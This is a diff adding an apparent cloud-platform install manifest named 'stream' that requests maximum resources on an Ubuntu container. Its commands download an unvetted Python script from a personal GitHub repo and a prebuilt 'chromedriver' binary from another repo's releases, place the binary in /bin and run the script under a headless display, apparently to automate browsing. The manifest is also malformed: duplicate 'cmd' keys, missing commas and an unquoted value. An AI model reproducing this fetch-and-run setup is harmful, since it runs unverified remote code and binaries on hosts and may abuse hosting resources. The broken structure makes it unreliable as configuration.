@@ -1,0 +1,35 @@
+{
+  "categories": ["export"],
+  "description": {"text": "live"},
+  "name": stream,
+  "nodes": [{
+    "cloudlets": 99,
+    "diskLimit": "10G",
+    "docker": {
+      "cmd": "apt install python3-pip -y",
+      "cmd": "pip3 install selenium",
+      "cmd": "apt install xvfb -y",
+      "cmd": "apt install wget -y",
+      "cmd": "export DISPLAY=${XVFB_DISPLAY:-:1}",
+      "cmd": "screen=${XVFB_SCREEN:-0}",
+      "cmd": "resolution=${XVFB_RESOLUTION:-1280x1024x24}",
+      "cmd": "timeout=${XVFB_TIMEOUT:-5}",
+      "cmd": "Xvfb ${DISPLAY} -screen ${screen} ${resolution} &",
+      "cmd": "wget https://raw.githubusercontent.com/codem001/magic/main/live.py -O ~/live.py",
+      "cmd": "wget https://github.com/codem001/pkt/releases/download/1/chromedriver -O /bin/chromedriver"
+      "cmd": "chmod +x /bin/chromedriver"
+      "cmd": "xvfb-run python3.10 ~/live.py"
+      
+      
+      
+      "env": {
+        "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+      },
+      "image": "ubuntu:latest"
+    },
+    "fixedCloudlets": 99,
+    "nodeGroup": "cp"
+  }],
+  "type": "install",
+  "version": "6.3.2"
+}
